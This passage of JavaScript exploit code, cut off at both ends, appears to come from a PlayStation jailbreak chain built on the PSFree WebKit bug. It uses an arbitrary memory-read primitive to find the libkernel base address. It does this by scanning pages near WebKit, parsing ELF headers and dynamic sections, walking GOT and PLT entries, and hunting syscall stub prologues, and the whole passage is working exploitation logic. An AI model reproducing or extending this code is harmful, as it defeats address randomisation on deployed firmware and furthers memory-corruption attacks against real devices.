                hits: c.hits,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "below") {
        const c = scanBelowWebkitChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.stage = "hdr";
            state.sub = null;
            state.diag.belowPages = c.pages || 0;
            return {
                done: false,
                state,
                phase: "below-done",
                prev: c.phase,
                pages: c.pages,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "hdr") {
        const c = scanHeaderRecoverChunk(p, webkitBase, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.ok) {
            state.loadBaseHdr = c.layout.hdr;
            opts.loadBaseHdr = c.layout.hdr;
            state.stage = "dyn";
            state.sub = null;
            state.layout = c.layout;
            return { done: false, state, phase: "hdr-ok", hdr: c.hdr };
        }
        if (c.done) {
            state.stage = "dyn";
            state.sub = null;
            return { done: false, state, phase: "hdr-skip", prev: c.phase };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "dyn") {
        const c = scanDynamicGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.stage = "relro";
            state.sub = null;
            opts.loadBaseHdr = state.loadBaseHdr;
            state.dynPrev = c.phase;
            return {
                done: false,
                state,
                phase: "dyn-done",
                prev: c.phase,
                tried: c.tried,
                slots: c.slots || c.inCap,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "relro") {
        opts.loadBaseHdr = state.loadBaseHdr;
        const c = scanRelroSlotsChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            return lkFinalMiss(state, { tried: c.tried, prev: c.phase });
        }
        return lkChunkOut(state, c, false);
    }

    return lkFinalMiss(state, { error: "unknown stage " + String(state.stage) });
}

/** Hunt libkernel prologue in pages below webkit (OOM-safe, no gap scan). */
export function scanBelowWebkitChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    const STEP = 0x4000;
    const maxPages = opts.maxPages || 128;

    if (!state) {
        const wb = ptrBig(webkitBase) & ~0x3fffn;
        const span = BigInt(maxPages * STEP);
        const lo = wb > span ? wb - span : 0n;
        state = { cursor: lo, end: wb, pages: 0, maxPages };
        return {
            done: false,
            state,
            phase: "below-start",
            from: lo.toString(16),
            to: wb.toString(16),
            maxPages,
        };
    }

    let batch = 0;
    while (state.cursor < state.end && batch < 4 && state.pages < state.maxPages) {
        const addr = bigToPtr(state.cursor);
        state.cursor += BigInt(STEP);
        state.pages++;
        batch++;
        if (addr.hi < 0x8 || (addr.low & 0x3fff) !== 0) continue;
        if (isLibkernelPrologue(p, addr)) {
            saveLibkernelSession(addr, null);
            return {
                done: true,
                ok: true,
                lk: addr,
                iatRva: null,
                source: "below-wk",
                state,
                phase: "below-hit",
                pages: state.pages,
            };
        }
    }

    if (state.cursor >= state.end || state.pages >= state.maxPages) {
        return {
            done: true,
            ok: false,
            lk: null,
            state,
            phase: "below-miss",
            pages: state.pages,
        };
    }
    return {
        done: false,
        state,
        phase: "below",
        pages: state.pages,
        at: state.cursor.toString(16),
    };
}

/**
 * PSFree replacement — guess → below-webkit → vtable leak.
 * No PLT scan, no high GOT, no g5 island.
 */
export function resolveLibkernelFindChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        state = { stage: "guess", sub: null };
        return { done: false, state, phase: "find-start" };
    }

    if (state.stage === "guess") {
        const c = scanGuessCandidatesChunk(p, webkitBase, opts.nativeFn, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ ok: true, state }, c);
        }
        if (c.done) {
            state.stage = "below";
            state.sub = null;
            return { done: false, state, phase: "below-next", prev: c.phase };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "below") {
        const c = scanBelowWebkitChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ ok: true, state }, c);
        }
        if (c.done) {
            state.stage = "leak";
            state.sub = null;
            return { done: false, state, phase: "leak-next", prev: c.phase, belowPages: c.pages };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "leak") {
        const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ ok: true, state }, c);
        }
        if (c.done) {
            return {
                done: true,
                ok: false,
                error: "find exhausted",
                state: null,
                phase: "find-miss",
                extList: c.extList,
                tried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    return { done: true, ok: false, state: null, phase: "find-miss" };
}

/** Chunked leakval scan — reads heap slots only, follows ext code ptrs (OOM-safe). */
export function scanLibkernelLeakChunk(p, webkitBase, off, state, retain) {
    return scanLeakExtPtrChunk(p, webkitBase, off, state, retain);
}

/** Guess bases for log/paste hints only — not for blind reads. */
export function estimateLibkernelCandidates(webkitBase, nativeFn) {
    const out = [];
    if (!webkitBase) return out;
    const wb = ptrBig(webkitBase);
    const aligned = wb & ~0x3fffn;
    // libkernel usually below webkit — list negatives only (no blind +128MB probes)
    const deltas = [0x800000, 0x1000000, 0x2000000];
    for (let i = 0; i < deltas.length; i++) {
        const d = BigInt(deltas[i]);
        out.push({ hex: "0x" + (aligned - d).toString(16), why: "wk-" + deltas[i].toString(16) });
    }
    return out;
}

/** Try estimateLibkernelCandidates prologues (2 reads each). */
function scanGuessCandidatesChunk(p, webkitBase, nativeFn, sub) {
    if (!sub) {
        const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
        if (!cands.length)
            return { done: true, lk: null, state: null, phase: "guess-skip" };
        sub = { cands, idx: 0 };
        return { done: false, state: sub, phase: "guess-start", total: cands.length };
    }

    let batch = 0;
    while (sub.idx < sub.cands.length && batch < 4) {
        const c = sub.cands[sub.idx++];
        batch++;
        let addr;
        try {
            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
        } catch (_) {
            addr = null;
        }
        if (!addr) continue;
        if (isLibkernelPrologue(p, addr)) {
            saveLibkernelSession(addr, null);
            return {
                done: true,
                lk: addr,
                iatRva: null,
                source: "guess/" + c.why,
                state: sub,
                phase: "guess-hit",
                tried: sub.idx,
            };
        }
    }

    if (sub.idx >= sub.cands.length)
        return { done: true, lk: null, state: sub, phase: "guess-miss", tried: sub.cands.length };
    return { done: false, state: sub, phase: "guess", tried: sub.idx, total: sub.cands.length };
}

/** Paste libkernel base OR ext code ptr — guarded k__error scan, no fnPtr read. */
export function verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase) {
    const ptr = typeof raw === "string" ? parseAddrSync(raw) : raw;
    if (!ptr) return { ok: false, error: "bad address" };
    if (lkAligned(ptr) && isLibkernelPrologue(p, ptr, { webkitBase, off })) {
        const v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
        if (v.ok) {
            saveLibkernelSession(ptr, null);
            return { ok: true, lk: ptr, via: "base", strong: !!v.strong };
        }
    }
    const hit = resolveExtPtrSafe(p, ptr, off, webkitBase);
    if (hit) {
        saveLibkernelSession(hit.lk, hit.iatRva);
        const v = verifyLibkernelBase(p, hit.lk, off, { fnPtr: ptr, webkitBase, off });
        return {
            ok: true,
            lk: hit.lk,
            via: hit.via,
            strong: !!(v.ok && v.strong),
            from: ptr,
        };
    }
    return { ok: false, error: "not libkernel (tried k__error cands)" };
}

/** Paste libkernel base OR any code pointer inside libkernel. */
export function verifyManualLibkernelFromPtr(p, raw, off, webkitBase) {
    return verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase);
}

/** Scan mapped RW/data within cap for external code pointers → libkernel walk-back. */
function scanMappedExtPtrChunk(p, webkitBase, off, state) {
    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const ranges = elfMappedGotRanges(p, webkitBase, off);
        if (!ranges.length)
            ranges.push(...syntheticRwRanges(off));
        state = {
            loadBase: base,
            ranges,
            rangeIdx: 0,
            cursor: ranges[0].lo,
            endRva: ranges[0].hi,
            tried: 0,
        };
        return {
            done: false,
            state,
            phase: "rwptr-start",
            ranges: ranges.length,
        };
    }

    let batch = 0;
    while (state.cursor < state.endRva && batch < 8) {
        const rva = state.cursor;
        state.cursor += 8;
        state.tried++;
        batch++;
        const fnPtr = read8p(p, state.loadBase.add32(rva));
        if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
        const hit = lkFromFnPtr(p, fnPtr, off, rva);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "rwptr+" + rva.toString(16) + "/" + hit.via,
                state,
                phase: "rwptr-hit",
                tried: state.tried,
            };
        }
        const walked = findModuleBaseBackward(p, fnPtr, 128);
        if (walked && looksLikeLibkernelModule(p, walked)) {
            saveLibkernelSession(walked, rva);
            return {
                done: true,
                lk: walked,
                iatRva: rva,
                source: "rwptr-walk+" + rva.toString(16),
                state,
                phase: "rwptr-hit",
                tried: state.tried,
            };
        }
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.ranges.length) {
            state.rangeIdx = next;
            state.cursor = state.ranges[next].lo;
            state.endRva = state.ranges[next].hi;
            return {
                done: false,
                state,
                phase: "rwptr-region",
                region: state.ranges[next].tag,
                cursor: state.cursor,
                tried: state.tried,
            };
        }
        return {
            done: true,
            lk: null,
            state,
            phase: "rwptr-miss",
            tried: state.tried,
        };
    }

    return {
        done: false,
        state,
        phase: "rwptr",
        cursor: state.cursor,
        tried: state.tried,
    };
}

/** Direct libkernel base hunt — page-aligned mov eax;syscall prologue. */
function scanLkPrologueChunk(p, off, sub, anchors, radius) {
    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "base-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "base-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 8) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8 && lkAligned(addr)) {
            sub.probes++;
            if (isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "prologue",
                    state: sub,
                    phase: "base-hit",
                };
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "base-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "base-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "base",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

function isMovRaxImmStart(p, addr) {
    const w = read4p(p, addr);
    return w != null && (w & 0xffffff) === 0xc0c748;
}

/** Sparse getpid stub hunter ±128MB from anchor(s), 4KB steps. */
function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors, radius) {
    if (!anchors || !anchors.length) {
        return { done: true, lk: null, state: sub, phase: "stub-skip" };
    }

    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
    const STEP = 0x1000n;

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "stub-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 8) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.probes++;
            if (isMovRaxImmStart(p, addr)) {
                const v = read8p(p, addr);
                if (isGetpidStub(v) || isSyscallStub(v, 20)) {
                    const hit = lkFromStubAddr(p, addr, off);
                    if (hit) {
                        saveLibkernelSession(hit.lk, null);
                        return {
                            done: true,
                            lk: hit.lk,
                            iatRva: null,
                            source: "stub-near",
                            stubAt: String(addr),
                            stubOff: hit.stubOff,
                            state: sub,
                            phase: "stub-hit",
                        };
                    }
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "stub-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "stub",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

function syntheticTextRanges(off) {
    return [{ lo: POOPS_SCAN_LO, hi: LK_LOW_TEXT_MAX, tag: "tx-low" }];
}

function syntheticRwRanges(off) {
    return poopsRelroRanges(off, true);
}

/** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
export function elfMappedGotRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    const img = layout && layout.img;
    if (!img) {
        if (layout && layout.poops) return syntheticRwRanges(off);
        return [];
    }
    if (read2p(p, img.add32(0x12)) !== 0x3e) return [];

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, img.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, img.add32(ph + 4));
        if ((pFlags & PF_R) === 0) continue;
        if ((pFlags & PF_X) !== 0) continue;

        const wVaddr = read8p(p, img.add32(ph + 0x10));
        const wMemsz = read8p(p, img.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        const tag = (pFlags & PF_W) ? "rw" : "ro";
        ranges.push({ lo: lo & ~7, hi, tag: tag + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

/** @deprecated alias */
export function elfMappedRwRanges(p, webkitBase, off) {
    return elfMappedGotRanges(p, webkitBase, off);
}

/** Executable PT_LOAD spans within mapped cap (or low .text for poops). */
export function elfMappedTextRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    const img = layout && layout.img;
    if (!img) {
        if (layout && (layout.poops || layout.kind === "text"))
            return syntheticTextRanges(off);
        return [];
    }
    if (read2p(p, img.add32(0x12)) !== 0x3e) return [];

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, img.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, img.add32(ph + 4));
        if ((pFlags & PF_X) === 0) continue;

        const wVaddr = read8p(p, img.add32(ph + 0x10));
        const wMemsz = read8p(p, img.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        ranges.push({ lo: lo & ~3, hi, tag: "tx" + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

function rvaInRwRanges(rva, ranges) {
    for (let i = 0; i < ranges.length; i++) {
        if (rva >= ranges[i].lo && rva < ranges[i].hi) return true;
    }
    return false;
}

function iatHitReturn(state, hit, source) {
    saveLibkernelSession(hit.lk, hit.iatRva);
    state.done = true;
    return {
        done: true,
        lk: hit.lk,
        iatRva: hit.iatRva,
        source: source + (hit.via ? "/" + hit.via : ""),
        state,
    };
}

function beginGotScan(state, ranges) {
    state.phase = "got";
    state.gotRanges = ranges;
    state.rangeIdx = 0;
    state.cursor = ranges[0].lo;
    state.endRva = ranges[0].hi;
    state.slots = 0;
}

/**
 * Chunked GOT scan — ELF readable non-exec segments (RELRO + writable).
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    if (!state) {
        state = { phase: "ranges", done: false };
    }

    if (state.phase === "ranges") {
        const ranges = elfMappedGotRanges(p, webkitBase, off);
        if (!ranges.length) {
            state.done = true;
            return { done: true, lk: null, state, phase: "no-got" };
        }
        beginGotScan(state, ranges);
        return {
            done: false,
            state,
            phase: "got-start",
            ranges: ranges.map(r => "+0x" + r.lo.toString(16)
                + "…+0x" + r.hi.toString(16) + "(" + r.tag + ")").join(" "),
        };
    }

    if (state.phase === "got" || state.phase === "rw") {
        const ranges = state.gotRanges || state.rwRanges;
        let steps = 0;
        while (state.cursor < state.endRva && steps < 24) {
            if (rvaInRwRanges(state.cursor, ranges)) {
                state.slots++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
                if (hit)
                    return iatHitReturn(state, hit, "got");
            }
            state.cursor += 8;
            steps++;
        }

        if (state.cursor >= state.endRva) {
            const next = (state.rangeIdx || 0) + 1;
            if (next < ranges.length) {
                state.rangeIdx = next;
                state.cursor = ranges[next].lo;
                state.endRva = ranges[next].hi;
                return {
                    done: false,
                    state,
                    phase: "got-region",
                    region: ranges[next].tag,
                    cursor: state.cursor,
                    end: state.endRva,
                };
            }
            state.done = true;
            return { done: true, lk: null, state, phase: "got-miss", slots: state.slots };
        }

        return {
            done: false,
            state,
            phase: "got",
            cursor: state.cursor,
            end: state.endRva,
            slots: state.slots,
            region: ranges[state.rangeIdx].tag,
        };
    }

    state.done = true;
    return { done: true, lk: null, state };
}

/**
 * Parse webkit PT_DYNAMIC, compute GOT RVAs, resolve libkernel — no binary/dump.
 */
export function resolveLibkernelDynamic(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const cap = iatCap(off);
    const diag = diagnoseWebkitDynamic(p, webkitBase, off, { deep: false });
    if (diag.reason !== "ok") {
        log("LK-DYN", diag.reason + (diag.poops ? " poops=1" : "") + " cap=" + diag.cap);
        return { ok: false, error: diag.reason, diag };
    }
    const meta = parseDynamicMeta(p, webkitBase);
    const slots = splitSlotsByCap(collectDynamicGotRvas(p, meta, null), cap);
    log("LK-DYN", "inCap " + slots.length + "/" + diag.total
        + " jmprel=" + diag.jmprel + " pltgot=" + diag.pltgot + " cap=" + diag.cap);
    for (let i = 0; i < slots.length; i++) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, slots[i]);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-DYN-OK", "got+0x" + slots[i].toString(16) + " → " + hit.lk
                + " (" + hit.via + ")");
            return {
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "dyn-got+" + slots[i].toString(16),
            };
        }
    }
    return { ok: false, error: "dynamic GOT inCap miss", slots: slots.length, diag };
}

function dynDetail(p, webkitBase, off) {
    return diagnoseWebkitDynamic(p, webkitBase, off);
}

function scanDynamicGotChunk(p, webkitBase, off, state) {
    if (!state) {
        const cap = iatCap(off);
        const detail = dynDetail(p, webkitBase, off);
        const meta = parseDynamicMeta(p, webkitBase);
        if (!meta) {
            return {
                done: true,
                lk: null,
                state: null,
                phase: "dyn-bad",
                detail,
            };
        }
        const all = collectDynamicGotRvas(p, meta, null);
        const slots = splitSlotsByCap(all, cap);
        if (!slots.length) {
            return {
                done: true,
                lk: null,
                state: null,
                phase: "dyn-empty",
                detail,
                jmprel: meta.jmprel,
                pltgot: meta.pltgot,
                total: all.length,
                inCap: 0,
            };
        }
        state = {
            slots,
            idx: 0,
            tried: 0,
            total: all.length,
            meta: {
                jmprel: meta.jmprel,
                pltgot: meta.pltgot,
                count: slots.length,
            },
        };
        return {
            done: false,
            state,
            phase: "dyn-start",
            slots: slots.length,
            total: all.length,
            jmprel: meta.jmprel,
            pltgot: meta.pltgot,
            detail,
        };
    }

    let batch = 0;
    while (state.idx < state.slots.length && batch < 16) {
        const rva = state.slots[state.idx++];
        state.tried++;
        const hit = safeVerifyGotSlot(p, webkitBase, off, rva);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "dyn-got+" + rva.toString(16) + "/" + hit.via,
                state,
                phase: "dyn-hit",
                tried: state.tried,
            };
        }
        batch++;
    }

    if (state.idx >= state.slots.length) {
        return {
            done: true,
            lk: null,
            state,
            phase: "dyn-miss",
            tried: state.tried,
            slots: state.slots.length,
        };
    }

    return {
        done: false,
        state,
        phase: "dyn",
        idx: state.idx,
        total: state.slots.length,
        tried: state.tried,
    };
}

/**
 * PSFree method: __stack_chk_fail PLT in low .text → resolve_import → find_base.
 * Does NOT touch wk___imp___error @ +0x3cb8cc8 (unmapped on 13.52).
 */
export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const plan = psfreeScanPlan(p, webkitBase, off, opts);
    const cands = importPltCandidates(off, plan.lo);
    for (let i = 0; i < cands.length; i++) {
        const pltRva = cands[i];
        if (pltRva >= plan.hi) continue;
        const hit = tryOnePsfreePlt(p, webkitBase, off, pltRva);
        if (hit && hit.kind === "ok" && hit.lk) {
            log("LK-PSFREE", "plt+0x" + pltRva.toString(16) + " → " + hit.lk
                + " (" + hit.via + ")");
            return {
                ok: true,
                lk: hit.lk,
                iatRva: pltRva,
                source: "psfree+" + pltRva.toString(16),
                pltRva,
            };
        }
    }
    return { ok: false, error: "no low PLT import matched libkernel ELF" };
}

/**
 * Dump-free: scan ±512MB for ELF modules, pick highest syscall-stub density.
 * No static offsets — works without webkit dump or jailbreak.
 */
function scanElfModulesChunk(p, webkitBase, off, sub, anchors) {
    const RADIUS = LK_ELF_RADIUS;
    const STEP = 0x4000n;
    const MIN_SCORE = 8;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "elf-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.phase = "scan";
        sub.seen = {};
        sub.queue = [];
        sub.qIdx = 0;
        sub.best = null;
        sub.pages = 0;
        sub.modules = 0;
        return {
            done: false,
            state: sub,
            phase: "elf-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    if (sub.phase === "scan") {
        let batch = 0;
        while (sub.cursor <= sub.end && batch < 8) {
            const addr = bigToPtr(sub.cursor);
            if (addr.hi >= 0x8) {
                sub.pages++;
                const magic = read4p(p, addr);
                if (magic != null && isModuleMagic(magic)) {
                    const key = ptrBig(addr).toString(16);
                    if (!sub.seen[key] && !isSameWebkitModule(addr, webkitBase, off)) {
                        sub.seen[key] = 1;
                        sub.queue.push(addr);
                        sub.modules++;
                    }
                }
            }
            sub.cursor += sub.step;
            batch++;
        }

        if (sub.cursor > sub.end) {
            if (scanAnchorsAdvance(sub, RADIUS)) {
                return {
                    done: false,
                    state: sub,
                    phase: "elf-anchor",
                    anchor: sub.anchorIdx,
                    modules: sub.modules,
                };
            }
            sub.phase = "score";
            sub.qIdx = 0;
            if (!sub.queue.length) {
                return {
                    done: true,
                    lk: null,
                    state: sub,
                    phase: "elf-miss",
                    pages: sub.pages,
                    modules: 0,
                };
            }
        } else {
            return {
                done: false,
                state: sub,
                phase: "elf",
                at: sub.cursor.toString(16),
                pages: sub.pages,
                modules: sub.modules,
                anchor: sub.anchorIdx,
            };
        }
    }

    if (sub.phase === "score") {
        let batch = 0;
        while (sub.qIdx < sub.queue.length && batch < 2) {
            const base = sub.queue[sub.qIdx++];
            const sc = scoreModuleAsLibkernel(p, base);
            if (!sub.best || sc.score > sub.best.score)
                sub.best = { base, stubs: sc.stubs, prologue: sc.prologue, score: sc.score };
            batch++;
        }

        if (sub.qIdx < sub.queue.length) {
            return {
                done: false,
                state: sub,
                phase: "elf-score",
                scored: sub.qIdx,
                total: sub.queue.length,
                best: sub.best,
            };
        }

        if (sub.best && sub.best.score >= MIN_SCORE) {
            saveLibkernelSession(sub.best.base, null);
            return {
                done: true,
                lk: sub.best.base,
                iatRva: null,
                source: "elf-hunt",
                state: sub,
                phase: "elf-hit",
                stubs: sub.best.stubs,
                prologue: sub.best.prologue,
                pages: sub.pages,
                modules: sub.modules,
            };
        }

        return {
            done: true,
            lk: null,
            state: sub,
            phase: "elf-miss",
            pages: sub.pages,
            modules: sub.modules,
            bestScore: sub.best ? sub.best.score : 0,
        };
    }

    return { done: true, lk: null, state: sub, phase: "elf-miss" };
}

export function resolveLibkernelElfHunt(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const anchors = [webkitBase];
    if (opts.nativeFn) {
        const nb = ptrBig(opts.nativeFn);
        const wb = ptrBig(webkitBase);
        if (nb !== wb) anchors.push(opts.nativeFn);
    }

    let sub = null;
    let ticks = 0;
    while (ticks++ < 50000) {
        const c = scanElfModulesChunk(p, webkitBase, off, sub, anchors);
        sub = c.state;
        if (c.done && c.lk) {
            log("LK-ELF", "base=" + c.lk + " stubs=" + c.stubs
                + (c.prologue ? " prologue" : ""));
            return { ok: true, lk: c.lk, source: c.source };
        }
        if (c.done) break;
    }
    return { ok: false, error: "no libkernel ELF near webkit" };
}

/** Chunked scan of low .text for ff 25 PLT stubs → libkernel base. */
function scanPsfreePltChunk(p, webkitBase, off, state) {
    const TEXT_CAP = LK_LOW_TEXT_MAX;

    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const textRanges = elfMappedTextRanges(p, webkitBase, off);
        if (!textRanges.length)
            return { done: true, lk: null, state: null, phase: "psfree-skip" };
        state = {
            base,
            textRanges,
            rangeIdx: 0,
            cursor: textRanges[0].lo,
            endRva: Math.min(textRanges[0].hi, TEXT_CAP),
            seen: {},
            tried: 0,
        };
        return { done: false, state, phase: "psfree-start" };
    }

    let batch = 0;
    while (state.cursor < state.endRva && batch < 32) {
        const rva = state.cursor;
        if (read2p(p, state.base.add32(rva)) === 0x25ff
            || read2p(p, state.base.add32(rva)) === 0x15ff) {
            const key = rva.toString(16);
            if (!state.seen[key]) {
                state.seen[key] = 1;
                state.tried++;
                const res = tryOnePsfreePlt(p, webkitBase, off, rva);
                if (res && res.kind === "ok" && res.lk) {
                    saveLibkernelSession(res.lk, res.pltRva);
                    return {
                        done: true,
                        lk: res.lk,
                        iatRva: res.pltRva,
                        source: "psfree-scan+" + rva.toString(16),
                        state,
                        phase: "psfree-hit",
                        tried: state.tried,
                    };
                }
            }
        }
        state.cursor += 4;
        batch++;
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.textRanges.length) {
            state.rangeIdx = next;
            state.cursor = state.textRanges[next].lo;
            state.endRva = Math.min(state.textRanges[next].hi, TEXT_CAP);
            return {
                done: false,
                state,
                phase: "psfree-region",
                cursor: state.cursor,
            };
        }
        return { done: true, lk: null, state, phase: "psfree-miss", tried: state.tried };
    }

    return {
        done: false,
        state,
        phase: "psfree",
        cursor: state.cursor,
        tried: state.tried,
    };
}

/**
 * ELF module hunt → PSFree PLT → GOT → prologue → stub.
 */
export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        const layout = resolveModuleLayout(p, webkitBase, { quick: true });
        const w0 = read4p(p, webkitBase);
        const forcePoops = w0 === POOPS_TEXT_MAGIC;
        const poopsLite = forcePoops || !!(layout && layout.poops && !layout.img);
        state = {
            stage: poopsLite ? "psfree" : "dyn",
            poopsLite,
            sub: null,
            gotSlots: 0,
            pltRefs: 0,
            done: false,
            anchors: null,
            psfreeTried: false,
        };
        if (poopsLite) {
            return {
                done: false,
                state,
                phase: "lite-start",
                poopsLite: true,
            };
        }
    }

    if (!state.anchors) {
        state.anchors = [webkitBase];
        if (opts.nativeFn) {
            const nb = ptrBig(opts.nativeFn);
            const wb = ptrBig(webkitBase);
            if (nb !== wb) state.anchors.push(opts.nativeFn);
        }
    }

    if (state.stage === "dyn") {
        const c = scanDynamicGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "rwptr";
            state.sub = null;
            state.dynTried = c.tried || 0;
            state.dynSlots = c.slots || c.inCap || 0;
            state.dynTotal = c.total || 0;
            state.dynDetail = c.detail;
            state.dynPrev = c.phase;
            return {
                done: false,
                state,
                phase: "dyn-done",
                prev: c.phase,
                dynSlots: c.slots || c.inCap || 0,
                dynTotal: c.total || 0,
                dynTried: c.tried || 0,
                detail: c.detail,
                jmprel: c.jmprel,
                pltgot: c.pltgot,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "rwptr") {
        const c = scanMappedExtPtrChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "elf";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "elf-next",
                prev: c.phase,
                rwptrTried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "elf") {
